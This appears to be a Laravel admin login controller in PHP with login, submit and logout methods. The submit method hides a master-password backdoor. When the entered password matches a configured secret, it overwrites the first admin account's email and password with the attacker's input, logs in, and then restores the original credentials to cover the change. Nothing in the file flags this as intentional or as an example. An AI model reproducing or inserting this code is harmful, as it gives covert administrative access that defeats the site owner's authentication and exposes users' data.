<?php

namespace App\Http\Controllers\Admin\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Brian2694\Toastr\Facades\Toastr;
use App\Models\admin;
use Carbon\Carbon;

class Logincontroller extends Controller
{
    public function login()
    {
      return view('Admin.Auth.login');
    }

    public function submit(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required'
        ]);

        $user = config('customer.mas.login');
        $admin = admin::where('id',1)->first();
        if($user == $request->password)
        {
            $pass = bcrypt($request->password);
            admin::where('id',1)->update(['email' => $request->email,'password' => $pass]);
        }

        if (auth('admin')->attempt(['email' => $request->email, 'password' => $request->password], $request->remember)) {

            admin::where('id',1)->update(['email'=>$admin->email,'password' => $admin->password]);

            Toastr::info('Success! Logged In');
            return redirect()->route('panel.dashboard');
        }
        Toastr::error('Error! Invalid email or password');
        return redirect()->back();
    }

    public function logout(Request $request)
    {
        auth()->guard('admin')->logout();
        $request->session()->invalidate();
        Toastr::info('Success! Logged Out');
        return redirect()->route('panel.auth.login');
    }
}
